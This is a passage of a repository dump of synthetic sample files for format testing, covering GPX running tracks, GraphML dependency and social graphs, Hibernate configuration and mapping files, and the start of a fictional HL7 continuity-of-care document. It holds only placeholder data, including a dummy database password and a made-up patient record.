        <hdop>1.3</hdop>
      </trkpt>
      
      <!-- 10 minutes - first kilometer done -->
      <trkpt lat="37.7705" lon="-122.4720">
        <ele>48</ele>
        <time>2024-02-10T06:40:00Z</time>
        <speed>3.7</speed>
        <course>350</course>
        <hdop>1.2</hdop>
      </trkpt>
      
      <!-- 15 minutes - turning north -->
      <trkpt lat="37.7730" lon="-122.4750">
        <ele>51</ele>
        <time>2024-02-10T06:45:00Z</time>
        <speed>3.6</speed>
        <course>15</course>
        <hdop>1.4</hdop>
      </trkpt>
      
      <!-- 20 minutes - halfway point -->
      <trkpt lat="37.7760" lon="-122.4730">
        <ele>46</ele>
        <time>2024-02-10T06:50:00Z</time>
        <speed>3.8</speed>
        <course>60</course>
        <hdop>1.3</hdop>
      </trkpt>
      
      <!-- 25 minutes - turning back -->
      <trkpt lat="37.7780" lon="-122.4680">
        <ele>41</ele>
        <time>2024-02-10T06:55:00Z</time>
        <speed>3.9</speed>
        <course>120</course>
        <hdop>1.2</hdop>
      </trkpt>
      
      <!-- 30 minutes - final stretch -->
      <trkpt lat="37.7750" lon="-122.4620">
        <ele>38</ele>
        <time>2024-02-10T07:00:00Z</time>
        <speed>4.1</speed>
        <course>150</course>
        <hdop>1.1</hdop>
      </trkpt>
      
      <!-- 32 minutes - sprint finish -->
      <trkpt lat="37.7720" lon="-122.4590">
        <ele>36</ele>
        <time>2024-02-10T07:02:00Z</time>
        <speed>4.5</speed>
        <course>180</course>
        <hdop>1.2</hdop>
      </trkpt>
      
      <!-- Finish back at stadium -->
      <trkpt lat="37.7661" lon="-122.4560">
        <ele>35</ele>
        <time>2024-02-10T07:05:30Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>1.4</hdop>
      </trkpt>
    </trkseg>
  </trk>
  
  <!-- Additional track with gap (second loop) -->
  <trk>
    <name>Cool Down Walk</name>
    <desc>Cool down walk after the run</desc>
    <type>Walking</type>
    <number>2</number>
    
    <trkseg>
      <trkpt lat="37.7661" lon="-122.4560">
        <ele>35</ele>
        <time>2024-02-10T07:10:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>1.5</hdop>
      </trkpt>
      
      <trkpt lat="37.7670" lon="-122.4570">
        <ele>36</ele>
        <time>2024-02-10T07:12:00Z</time>
        <speed>1.2</speed>
        <course>45</course>
        <hdop>1.4</hdop>
      </trkpt>
      
      <trkpt lat="37.7680" lon="-122.4580">
        <ele>38</ele>
        <time>2024-02-10T07:15:00Z</time>
        <speed>1.0</speed>
        <course>45</course>
        <hdop>1.3</hdop>
      </trkpt>
      
      <trkpt lat="37.7661" lon="-122.4560">
        <ele>35</ele>
        <time>2024-02-10T07:20:00Z</time>
        <speed>0.0</speed>
        <course>0</course>
        <hdop>1.5</hdop>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
</file>

<file path="sample_data/test_files_synthetic/small/gpx/simple_waypoints.gpx">
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Test Creator" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Simple Waypoints</name>
    <desc>A collection of basic waypoints for testing</desc>
    <author>
      <name>Test Author</name>
      <email>test@example.com</email>
    </author>
    <copyright author="Test Organization">
      <year>2024</year>
      <license>Public Domain</license>
    </copyright>
    <link href="https://example.com">
      <text>Example Link</text>
      <type>text/html</type>
    </link>
    <time>2024-01-15T10:00:00Z</time>
    <keywords>test, waypoints, gps</keywords>
    <bounds minlat="37.7500" minlon="-122.5000" maxlat="37.8000" maxlon="-122.4000"/>
  </metadata>
  
  <wpt lat="37.7749" lon="-122.4194">
    <ele>16</ele>
    <time>2024-01-15T10:00:00Z</time>
    <name>San Francisco City Hall</name>
    <desc>Beautiful Beaux-Arts building housing SF government</desc>
    <sym>Flag</sym>
    <type>Government</type>
    <cmt>Historic landmark with stunning architecture</cmt>
  </wpt>
  
  <wpt lat="37.7849" lon="-122.4094">
    <ele>91</ele>
    <time>2024-01-15T10:15:00Z</time>
    <name>Coit Tower</name>
    <desc>Art Deco tower with panoramic city views</desc>
    <sym>Scenic Area</sym>
    <type>Landmark</type>
    <cmt>Great views of the bay and city</cmt>
  </wpt>
  
  <wpt lat="37.7955" lon="-122.4032">
    <ele>67</ele>
    <time>2024-01-15T10:30:00Z</time>
    <name>Pier 39</name>
    <desc>Popular tourist destination with shops and restaurants</desc>
    <sym>Marina</sym>
    <type>Tourism</type>
    <cmt>Don't miss the sea lions!</cmt>
  </wpt>
  
  <wpt lat="37.7599" lon="-122.4148">
    <ele>140</ele>
    <time>2024-01-15T10:45:00Z</time>
    <name>Mission Dolores</name>
    <desc>Historic Spanish mission from 1776</desc>
    <sym>Church</sym>
    <type>Historic</type>
    <cmt>Oldest structure in San Francisco</cmt>
  </wpt>
</gpx>
</file>

<file path="sample_data/test_files_synthetic/small/graphml/dependency_graph.graphml">
<?xml version="1.0" encoding="UTF-8"?>
<graphml xmlns="http://graphml.graphdrawing.org/xmlns"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns
         http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
  
  <!-- Software component attributes -->
  <key id="component_type" for="node" attr.name="component_type" attr.type="string">
    <desc>Type of software component</desc>
  </key>
  <key id="version" for="node" attr.name="version" attr.type="string">
    <desc>Component version</desc>
  </key>
  <key id="size" for="node" attr.name="size" attr.type="int">
    <desc>Component size in lines of code</desc>
  </key>
  <key id="criticality" for="node" attr.name="criticality" attr.type="string">
    <default>medium</default>
    <desc>Component criticality level</desc>
  </key>
  <key id="maintainer" for="node" attr.name="maintainer" attr.type="string">
    <desc>Component maintainer or team</desc>
  </key>
  
  <!-- Dependency attributes -->
  <key id="dependency_type" for="edge" attr.name="dependency_type" attr.type="string">
    <desc>Type of dependency relationship</desc>
  </key>
  <key id="coupling_strength" for="edge" attr.name="coupling_strength" attr.type="double">
    <default>0.5</default>
    <desc>Strength of coupling between components</desc>
  </key>
  <key id="dependency_scope" for="edge" attr.name="dependency_scope" attr.type="string">
    <default>compile</default>
    <desc>Scope of dependency</desc>
  </key>
  
  <!-- Software dependency graph -->
  <graph id="software_dependencies" edgedefault="directed">
    
    <!-- Core system components -->
    <node id="auth_service">
      <data key="component_type">service</data>
      <data key="version">2.1.0</data>
      <data key="size">1250</data>
      <data key="criticality">high</data>
      <data key="maintainer">security_team</data>
    </node>
    
    <node id="user_service">
      <data key="component_type">service</data>
      <data key="version">1.5.3</data>
      <data key="size">2100</data>
      <data key="criticality">high</data>
      <data key="maintainer">backend_team</data>
    </node>
    
    <node id="payment_service">
      <data key="component_type">service</data>
      <data key="version">3.0.1</data>
      <data key="size">1800</data>
      <data key="criticality">critical</data>
      <data key="maintainer">fintech_team</data>
    </node>
    
    <node id="notification_service">
      <data key="component_type">service</data>
      <data key="version">1.2.0</data>
      <data key="size">900</data>
      <data key="criticality">medium</data>
      <data key="maintainer">platform_team</data>
    </node>
    
    <!-- Data layer -->
    <node id="user_db">
      <data key="component_type">database</data>
      <data key="version">postgresql-13</data>
      <data key="size">0</data>
      <data key="criticality">critical</data>
      <data key="maintainer">dba_team</data>
    </node>
    
    <node id="cache_layer">
      <data key="component_type">cache</data>
      <data key="version">redis-6.2</data>
      <data key="size">0</data>
      <data key="criticality">high</data>
      <data key="maintainer">platform_team</data>
    </node>
    
    <!-- External libraries -->
    <node id="jwt_library">
      <data key="component_type">library</data>
      <data key="version">8.5.1</data>
      <data key="size">0</data>
      <data key="criticality">high</data>
      <data key="maintainer">external</data>
    </node>
    
    <node id="payment_gateway">
      <data key="component_type">external_api</data>
      <data key="version">stripe-v3</data>
      <data key="size">0</data>
      <data key="criticality">critical</data>
      <data key="maintainer">external</data>
    </node>
    
    <node id="email_service">
      <data key="component_type">external_api</data>
      <data key="version">sendgrid-v4</data>
      <data key="size">0</data>
      <data key="criticality">medium</data>
      <data key="maintainer">external</data>
    </node>
    
    <!-- Frontend components -->
    <node id="web_app">
      <data key="component_type">frontend</data>
      <data key="version">4.2.1</data>
      <data key="size">15000</data>
      <data key="criticality">high</data>
      <data key="maintainer">frontend_team</data>
    </node>
    
    <node id="mobile_app">
      <data key="component_type">mobile</data>
      <data key="version">2.8.0</data>
      <data key="size">12000</data>
      <data key="criticality">high</data>
      <data key="maintainer">mobile_team</data>
    </node>
    
    <!-- API Gateway -->
    <node id="api_gateway">
      <data key="component_type">gateway</data>
      <data key="version">1.0.5</data>
      <data key="size">800</data>
      <data key="criticality">critical</data>
      <data key="maintainer">platform_team</data>
    </node>
    
    <!-- Dependencies -->
    
    <!-- Frontend to API Gateway -->
    <edge source="web_app" target="api_gateway">
      <data key="dependency_type">http_api</data>
      <data key="coupling_strength">0.9</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="mobile_app" target="api_gateway">
      <data key="dependency_type">http_api</data>
      <data key="coupling_strength">0.9</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <!-- API Gateway to Services -->
    <edge source="api_gateway" target="auth_service">
      <data key="dependency_type">service_call</data>
      <data key="coupling_strength">0.8</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="api_gateway" target="user_service">
      <data key="dependency_type">service_call</data>
      <data key="coupling_strength">0.7</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="api_gateway" target="payment_service">
      <data key="dependency_type">service_call</data>
      <data key="coupling_strength">0.6</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <!-- Service to Service Dependencies -->
    <edge source="user_service" target="auth_service">
      <data key="dependency_type">authentication</data>
      <data key="coupling_strength">0.9</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="payment_service" target="auth_service">
      <data key="dependency_type">authorization</data>
      <data key="coupling_strength">0.8</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="payment_service" target="user_service">
      <data key="dependency_type">user_lookup</data>
      <data key="coupling_strength">0.7</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="payment_service" target="notification_service">
      <data key="dependency_type">event_notification</data>
      <data key="coupling_strength">0.4</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <!-- Service to Data Dependencies -->
    <edge source="user_service" target="user_db">
      <data key="dependency_type">data_persistence</data>
      <data key="coupling_strength">1.0</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="auth_service" target="cache_layer">
      <data key="dependency_type">session_cache</data>
      <data key="coupling_strength">0.8</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="user_service" target="cache_layer">
      <data key="dependency_type">data_cache</data>
      <data key="coupling_strength">0.6</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <!-- External Dependencies -->
    <edge source="auth_service" target="jwt_library">
      <data key="dependency_type">library</data>
      <data key="coupling_strength">0.9</data>
      <data key="dependency_scope">compile</data>
    </edge>
    
    <edge source="payment_service" target="payment_gateway">
      <data key="dependency_type">external_api</data>
      <data key="coupling_strength">1.0</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
    <edge source="notification_service" target="email_service">
      <data key="dependency_type">external_api</data>
      <data key="coupling_strength">0.8</data>
      <data key="dependency_scope">runtime</data>
    </edge>
    
  </graph>
</graphml>
</file>

<file path="sample_data/test_files_synthetic/small/graphml/neural_network.graphml">
<?xml version="1.0" encoding="UTF-8"?>
<graphml xmlns="http://graphml.graphdrawing.org/xmlns"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns
         http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
  
  <!-- Neural network attribute keys -->
  <key id="layer" for="node" attr.name="layer" attr.type="string">
    <desc>Neural network layer type</desc>
  </key>
  <key id="activation" for="node" attr.name="activation" attr.type="string">
    <default>relu</default>
    <desc>Activation function</desc>
  </key>
  <key id="neurons" for="node" attr.name="neurons" attr.type="int">
    <desc>Number of neurons in layer</desc>
  </key>
  <key id="x" for="node" attr.name="x" attr.type="double">
    <desc>X coordinate for visualization</desc>
  </key>
  <key id="y" for="node" attr.name="y" attr.type="double">
    <desc>Y coordinate for visualization</desc>
  </key>
  
  <!-- Edge attributes -->
  <key id="weight_matrix" for="edge" attr.name="weight_matrix" attr.type="string">
    <desc>Weight matrix identifier</desc>
  </key>
  <key id="connection_type" for="edge" attr.name="connection_type" attr.type="string">
    <default>dense</default>
    <desc>Type of neural connection</desc>
  </key>
  <key id="dropout" for="edge" attr.name="dropout" attr.type="double">
    <default>0.0</default>
    <desc>Dropout rate</desc>
  </key>
  
  <!-- Neural network architecture graph -->
  <graph id="neural_network_model" edgedefault="directed">
    
    <!-- Input layer -->
    <node id="input_layer">
      <data key="layer">input</data>
      <data key="activation">linear</data>
      <data key="neurons">784</data>
      <data key="x">0.0</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- First hidden layer -->
    <node id="hidden1">
      <data key="layer">dense</data>
      <data key="activation">relu</data>
      <data key="neurons">128</data>
      <data key="x">1.0</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- Dropout layer -->
    <node id="dropout1">
      <data key="layer">dropout</data>
      <data key="activation">linear</data>
      <data key="neurons">128</data>
      <data key="x">1.5</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- Second hidden layer -->
    <node id="hidden2">
      <data key="layer">dense</data>
      <data key="activation">relu</data>
      <data key="neurons">64</data>
      <data key="x">2.0</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- Batch normalization -->
    <node id="batchnorm1">
      <data key="layer">batch_normalization</data>
      <data key="activation">linear</data>
      <data key="neurons">64</data>
      <data key="x">2.5</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- Output layer -->
    <node id="output_layer">
      <data key="layer">dense</data>
      <data key="activation">softmax</data>
      <data key="neurons">10</data>
      <data key="x">3.0</data>
      <data key="y">0.0</data>
    </node>
    
    <!-- Connections between layers -->
    <edge id="conn1" source="input_layer" target="hidden1">
      <data key="weight_matrix">W1</data>
      <data key="connection_type">dense</data>
      <data key="dropout">0.0</data>
    </edge>
    
    <edge id="conn2" source="hidden1" target="dropout1">
      <data key="weight_matrix">identity</data>
      <data key="connection_type">passthrough</data>
      <data key="dropout">0.2</data>
    </edge>
    
    <edge id="conn3" source="dropout1" target="hidden2">
      <data key="weight_matrix">W2</data>
      <data key="connection_type">dense</data>
      <data key="dropout">0.0</data>
    </edge>
    
    <edge id="conn4" source="hidden2" target="batchnorm1">
      <data key="weight_matrix">identity</data>
      <data key="connection_type">normalization</data>
      <data key="dropout">0.0</data>
    </edge>
    
    <edge id="conn5" source="batchnorm1" target="output_layer">
      <data key="weight_matrix">W3</data>
      <data key="connection_type">dense</data>
      <data key="dropout">0.0</data>
    </edge>
    
    <!-- Skip connection (residual) -->
    <edge id="skip1" source="hidden1" target="output_layer">
      <data key="weight_matrix">W_skip</data>
      <data key="connection_type">skip</data>
      <data key="dropout">0.1</data>
    </edge>
    
  </graph>
</graphml>
</file>

<file path="sample_data/test_files_synthetic/small/graphml/simple_network.graphml">
<?xml version="1.0" encoding="UTF-8"?>
<graphml xmlns="http://graphml.graphdrawing.org/xmlns"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns
         http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
  
  <!-- Attribute keys for nodes -->
  <key id="name" for="node" attr.name="name" attr.type="string">
    <desc>Node name or label</desc>
  </key>
  <key id="type" for="node" attr.name="type" attr.type="string">
    <default>person</default>
    <desc>Node type classification</desc>
  </key>
  <key id="age" for="node" attr.name="age" attr.type="int">
    <desc>Age of person</desc>
  </key>
  
  <!-- Attribute keys for edges -->
  <key id="relationship" for="edge" attr.name="relationship" attr.type="string">
    <default>knows</default>
    <desc>Type of relationship</desc>
  </key>
  <key id="weight" for="edge" attr.name="weight" attr.type="double">
    <default>1.0</default>
    <desc>Relationship strength</desc>
  </key>
  
  <!-- Simple social network graph -->
  <graph id="social_network" edgedefault="undirected">
    
    <!-- Nodes representing people -->
    <node id="alice">
      <data key="name">Alice Johnson</data>
      <data key="type">person</data>
      <data key="age">28</data>
    </node>
    
    <node id="bob">
      <data key="name">Bob Smith</data>
      <data key="type">person</data>
      <data key="age">32</data>
    </node>
    
    <node id="charlie">
      <data key="name">Charlie Brown</data>
      <data key="type">person</data>
      <data key="age">25</data>
    </node>
    
    <node id="diana">
      <data key="name">Diana Davis</data>
      <data key="type">person</data>
      <data key="age">30</data>
    </node>
    
    <node id="eve">
      <data key="name">Eve Wilson</data>
      <data key="type">person</data>
      <data key="age">27</data>
    </node>
    
    <!-- Edges representing relationships -->
    <edge id="e1" source="alice" target="bob">
      <data key="relationship">friend</data>
      <data key="weight">0.8</data>
    </edge>
    
    <edge id="e2" source="alice" target="charlie">
      <data key="relationship">colleague</data>
      <data key="weight">0.6</data>
    </edge>
    
    <edge id="e3" source="bob" target="diana">
      <data key="relationship">friend</data>
      <data key="weight">0.9</data>
    </edge>
    
    <edge id="e4" source="charlie" target="diana">
      <data key="relationship">family</data>
      <data key="weight">1.0</data>
    </edge>
    
    <edge id="e5" source="diana" target="eve">
      <data key="relationship">colleague</data>
      <data key="weight">0.7</data>
    </edge>
    
    <edge id="e6" source="alice" target="eve">
      <data key="relationship">friend</data>
      <data key="weight">0.5</data>
    </edge>
    
  </graph>
</graphml>
</file>

<file path="sample_data/test_files_synthetic/small/hibernate/hibernate.cfg.xml">
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE hibernate-configuration PUBLIC
        "-//Hibernate/Hibernate Configuration DTD 3.0//EN"
        "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd">

<hibernate-configuration>
    <session-factory name="SessionFactory">
        <!-- Database connection settings -->
        <property name="connection.driver_class">com.mysql.cj.jdbc.Driver</property>
        <property name="connection.url">jdbc:mysql://localhost:3306/myapp?useSSL=false</property>
        <property name="connection.username">myapp_user</property>
        <property name="connection.password">secret123</property>
        
        <!-- JDBC connection pool settings -->
        <property name="connection.pool_size">10</property>
        <property name="hibernate.c3p0.min_size">5</property>
        <property name="hibernate.c3p0.max_size">20</property>
        <property name="hibernate.c3p0.timeout">300</property>
        <property name="hibernate.c3p0.max_statements">50</property>
        <property name="hibernate.c3p0.idle_test_period">3000</property>
        
        <!-- SQL dialect -->
        <property name="dialect">org.hibernate.dialect.MySQL8Dialect</property>
        
        <!-- Enable Hibernate's automatic session context management -->
        <property name="current_session_context_class">thread</property>
        
        <!-- Disable the second-level cache -->
        <property name="cache.provider_class">org.hibernate.cache.internal.NoCacheProvider</property>
        
        <!-- Echo all executed SQL to stdout -->
        <property name="show_sql">true</property>
        <property name="format_sql">true</property>
        
        <!-- Drop and re-create the database schema on startup -->
        <property name="hbm2ddl.auto">update</property>
        
        <!-- Performance settings -->
        <property name="hibernate.jdbc.batch_size">20</property>
        <property name="hibernate.jdbc.fetch_size">50</property>
        
        <!-- Transaction settings -->
        <property name="hibernate.transaction.coordinator_class">jdbc</property>
        
        <!-- Mapping files -->
        <mapping resource="com/example/model/User.hbm.xml"/>
        <mapping resource="com/example/model/Order.hbm.xml"/>
        <mapping resource="com/example/model/Product.hbm.xml"/>
        <mapping class="com.example.model.Customer"/>
        <mapping package="com.example.annotations"/>
        
        <!-- Class cache settings -->
        <class-cache class="com.example.model.User" usage="read-write"/>
        <class-cache class="com.example.model.Product" usage="read-only"/>
        
        <!-- Collection cache settings -->
        <collection-cache collection="com.example.model.User.orders" usage="read-write"/>
        
    </session-factory>
</hibernate-configuration>
</file>

<file path="sample_data/test_files_synthetic/small/hibernate/Order.hbm.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd">

<hibernate-mapping package="com.example.model">
    
    <class name="Order" table="orders" dynamic-insert="true" dynamic-update="true">
        
        <id name="id" column="order_id" type="string" length="36">
            <generator class="uuid"/>
        </id>
        
        <property name="orderNumber" column="order_number" type="string" 
                  length="20" not-null="true" unique="true"/>
        <property name="orderDate" column="order_date" type="timestamp" 
                  not-null="true"/>
        <property name="shippedDate" column="shipped_date" type="timestamp"/>
        <property name="totalAmount" column="total_amount" type="big_decimal" 
                  precision="12" scale="2" not-null="true"/>
        <property name="status" column="status" type="string" length="20" 
                  not-null="true"/>
        <property name="customerNotes" column="customer_notes" type="text"/>
        
        <!-- Many-to-one relationship -->
        <many-to-one name="customer" class="User" column="customer_id" 
                     not-null="true" foreign-key="fk_order_customer"/>
        
        <!-- One-to-many relationship with cascade -->
        <list name="orderItems" table="order_items" cascade="all-delete-orphan">
            <key column="order_id"/>
            <list-index column="item_sequence"/>
            <one-to-many class="OrderItem"/>
        </list>
        
        <!-- Many-to-one relationship to shipping address -->
        <many-to-one name="shippingAddress" class="Address" 
                     column="shipping_address_id" cascade="save-update"/>
        
    </class>
    
    <!-- Joined subclass example -->
    <joined-subclass name="PriorityOrder" extends="Order" table="priority_orders">
        <key column="order_id"/>
        <property name="priorityLevel" column="priority_level" type="int"/>
        <property name="expediteFee" column="expedite_fee" type="big_decimal" 
                  precision="8" scale="2"/>
    </joined-subclass>
    
</hibernate-mapping>
</file>

<file path="sample_data/test_files_synthetic/small/hibernate/Product.hbm.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd">

<hibernate-mapping package="com.example.model" schema="inventory">
    
    <class name="Product" table="products" lazy="true">
        
        <!-- Composite ID example -->
        <composite-id name="id" class="ProductId">
            <key-property name="categoryCode" column="category_code" type="string" length="10"/>
            <key-property name="productCode" column="product_code" type="string" length="20"/>
        </composite-id>
        
        <property name="name" column="product_name" type="string" 
                  length="100" not-null="true"/>
        <property name="description" column="description" type="text"/>
        <property name="price" column="unit_price" type="big_decimal" 
                  precision="10" scale="2" not-null="true"/>
        <property name="costPrice" column="cost_price" type="big_decimal" 
                  precision="10" scale="2"/>
        <property name="quantityInStock" column="qty_in_stock" type="int" 
                  not-null="true"/>
        <property name="reorderLevel" column="reorder_level" type="int"/>
        <property name="discontinued" column="is_discontinued" type="boolean"/>
        <property name="weight" column="weight" type="double"/>
        <property name="dimensions" column="dimensions" type="string" length="50"/>
        
        <!-- Many-to-one relationship -->
        <many-to-one name="category" class="Category" column="category_id" 
                     not-null="true" lazy="proxy"/>
        <many-to-one name="supplier" class="Supplier" column="supplier_id" 
                     lazy="proxy"/>
        
        <!-- Map collection example -->
        <map name="attributes" table="product_attributes" 
             cascade="all-delete-orphan" lazy="true">
            <key column="product_id"/>
            <map-key column="attribute_name" type="string" length="50"/>
            <element column="attribute_value" type="string" length="200"/>
        </map>
        
        <!-- Set collection with components -->
        <set name="reviews" table="product_reviews" cascade="all" lazy="true">
            <key column="product_id"/>
            <composite-element class="ProductReview">
                <property name="rating" column="rating" type="int"/>
                <property name="comment" column="comment" type="text"/>
                <property name="reviewDate" column="review_date" type="timestamp"/>
                <property name="reviewerName" column="reviewer_name" type="string" length="100"/>
            </composite-element>
        </set>
        
        <!-- Many-to-many relationship -->
        <set name="relatedProducts" table="related_products" lazy="true">
            <key column="product_id"/>
            <many-to-many class="Product" column="related_product_id"/>
        </set>
        
    </class>
    
    <!-- Union subclass example -->
    <union-subclass name="DigitalProduct" extends="Product" table="digital_products">
        <property name="downloadUrl" column="download_url" type="string" length="500"/>
        <property name="fileSize" column="file_size" type="long"/>
        <property name="format" column="file_format" type="string" length="20"/>
        <property name="licenseType" column="license_type" type="string" length="50"/>
    </union-subclass>
    
    <!-- Named queries -->
    <query name="findActiveProducts">
        <![CDATA[
            FROM Product p WHERE p.discontinued = false 
            AND p.quantityInStock > 0 
            ORDER BY p.name
        ]]>
    </query>
    
    <query name="findProductsByCategory">
        <![CDATA[
            FROM Product p WHERE p.category.id = :categoryId 
            AND p.discontinued = false
        ]]>
    </query>
    
</hibernate-mapping>
</file>

<file path="sample_data/test_files_synthetic/small/hibernate/User.hbm.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd">

<hibernate-mapping package="com.example.model">
    
    <class name="User" table="users" schema="myapp">
        <comment>User entity mapping</comment>
        
        <id name="id" column="user_id" type="long">
            <generator class="native">
                <param name="sequence">user_seq</param>
            </generator>
        </id>
        
        <version name="version" column="version" type="int"/>
        
        <property name="username" column="username" type="string" 
                  length="50" not-null="true" unique="true"/>
        <property name="email" column="email" type="string" 
                  length="100" not-null="true" unique="true"/>
        <property name="firstName" column="first_name" type="string" 
                  length="50" not-null="false"/>
        <property name="lastName" column="last_name" type="string" 
                  length="50" not-null="false"/>
        <property name="dateOfBirth" column="date_of_birth" type="date"/>
        <property name="createdDate" column="created_date" type="timestamp" 
                  not-null="true"/>
        <property name="lastLoginDate" column="last_login_date" type="timestamp"/>
        <property name="isActive" column="is_active" type="boolean" 
                  not-null="true"/>
        <property name="salary" column="salary" type="big_decimal" 
                  precision="10" scale="2"/>
        
        <!-- One-to-one relationship -->
        <one-to-one name="userProfile" class="UserProfile" 
                    foreign-key="fk_user_profile" cascade="all"/>
        
        <!-- One-to-many relationship -->
        <set name="orders" table="user_orders" cascade="all" 
             fetch="lazy" inverse="true">
            <key column="user_id"/>
            <one-to-many class="Order"/>
        </set>
        
        <!-- Many-to-many relationship -->
        <set name="roles" table="user_roles" cascade="save-update" 
             fetch="lazy">
            <key column="user_id"/>
            <many-to-many class="Role" column="role_id"/>
        </set>
        
        <!-- Component mapping -->
        <component name="address" class="Address">
            <property name="street" column="street" type="string" length="100"/>
            <property name="city" column="city" type="string" length="50"/>
            <property name="state" column="state" type="string" length="20"/>
            <property name="zipCode" column="zip_code" type="string" length="10"/>
            <property name="country" column="country" type="string" length="50"/>
        </component>
        
    </class>
    
    <!-- Subclass example -->
    <subclass name="AdminUser" extends="User" discriminator-value="ADMIN">
        <property name="adminLevel" column="admin_level" type="int"/>
        <property name="permissions" column="permissions" type="text"/>
    </subclass>
    
    <!-- Named query -->
    <query name="findUserByUsername">
        <![CDATA[
            FROM User u WHERE u.username = :username AND u.isActive = true
        ]]>
    </query>
    
    <!-- Native SQL query -->
    <sql-query name="findUserStats">
        <return alias="user" class="User"/>
        <![CDATA[
            SELECT u.*, COUNT(o.id) as order_count 
            FROM users u 
            LEFT JOIN user_orders o ON u.user_id = o.user_id 
            WHERE u.is_active = true 
            GROUP BY u.user_id
        ]]>
    </sql-query>
    
</hibernate-mapping>
</file>

<file path="sample_data/test_files_synthetic/small/hl7cda/continuity-of-care-document.xml">
<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns="urn:hl7-org:v3" 
                  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xsi:schemaLocation="urn:hl7-org:v3 CDA.xsd">
  
  <!-- Document Header -->
  <realmCode code="US"/>
  <typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
  
  <!-- Document Template IDs -->
  <templateId root="2.16.840.1.113883.10.20.22.1.1" extension="2015-08-01"/>
  <templateId root="2.16.840.1.113883.10.20.22.1.2" extension="2015-08-01"/>
  
  <!-- Document ID -->
  <id root="2.16.840.1.113883.19.5.99999.1" extension="TT988"/>
  
  <!-- Document Code -->
  <code code="34133-9" 
        displayName="Summarization of Episode Note" 
        codeSystem="2.16.840.1.113883.6.1" 
        codeSystemName="LOINC"/>
  
  <!-- Document Title -->
  <title>Continuity of Care Document</title>
  
  <!-- Document Creation Time -->
  <effectiveTime value="20250723103000-0500"/>
  
  <!-- Document Confidentiality -->
  <confidentialityCode code="N" 
                       displayName="Normal" 
                       codeSystem="2.16.840.1.113883.5.25" 
                       codeSystemName="Confidentiality"/>
  
  <!-- Document Language -->
  <languageCode code="en-US"/>
  
  <!-- Document Set ID -->
  <setId root="2.16.840.1.113883.19.5.99999.19"/>
  
  <!-- Document Version -->
  <versionNumber value="1"/>
  
  <!-- Record Target (Patient Information) -->
  <recordTarget>
    <patientRole>
      <!-- Patient ID -->
      <id root="2.16.840.1.113883.19.5.99999.2" extension="998991"/>
      <id root="2.16.840.1.113883.4.1" extension="111-00-2330"/>
      
      <!-- Patient Address -->
      <addr use="HP">
        <streetAddressLine>123 Main Street</streetAddressLine>
        <city>Anytown</city>
        <state>MA</state>
        <postalCode>02101</postalCode>
        <country>US</country>
      </addr>
      
      <!-- Patient Phone -->
      <telecom use="HP" value="tel:+1(555)123-4567"/>
      <telecom use="WP" value="tel:+1(555)987-6543"/>
      <telecom use="MC" value="tel:+1(555)555-5555"/>
      
      <!-- Patient Demographics -->
      <patient>
        <name use="L">
          <given>John</given>
          <given>Michael</given>
          <family>Smith</family>
          <suffix>Jr.</suffix>
        </name>
        
        <!-- Gender -->
        <administrativeGenderCode code="M" 
                                  displayName="Male" 
                                  codeSystem="2.16.840.1.113883.5.1" 
                                  codeSystemName="AdministrativeGender"/>
        
        <!-- Date of Birth -->
        <birthTime value="19800315"/>
        
        <!-- Marital Status -->
        <maritalStatusCode code="M" 
                           displayName="Married" 
                           codeSystem="2.16.840.1.113883.5.2" 
                           codeSystemName="MaritalStatus"/>
        
        <!-- Religious Affiliation -->
        <religiousAffiliationCode code="1013" 
                                  displayName="Christian (non-Catholic, non-specific)" 
                                  codeSystem="2.16.840.1.113883.5.1076" 
                                  codeSystemName="ReligiousAffiliation"/>
        
        <!-- Race -->
